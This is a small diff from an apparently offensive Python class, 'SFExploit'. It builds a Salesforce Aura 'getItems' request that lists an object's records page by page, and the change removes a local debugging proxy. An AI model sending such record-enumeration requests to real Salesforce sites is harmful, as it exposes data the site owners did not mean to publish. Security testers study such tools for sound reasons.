@@ -162,7 +162,7 @@ class SFExploit:
 		message = json.dumps({"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":object_name,"layoutType":"FULL","pageSize":SF_RECORDS_PAGE_SIZE,"currentPage":0,"useTimeout":False,"getCount":True,"enableRowActions":False}}]})
 		post_body = {'message':message,'aura.context':self.context,'aura.token':self.token}
 		try:
-			send_request = requests.post(f"{self.url}{self.aura_endpoint}", headers = self.headers, data=post_body, cookies=self.cookies, verify=False, proxies={"https":"http://127.0.0.1:8080"})
+			send_request = requests.post(f"{self.url}{self.aura_endpoint}", headers = self.headers, data=post_body, cookies=self.cookies, verify=False)
 		except:
 			return None
 		
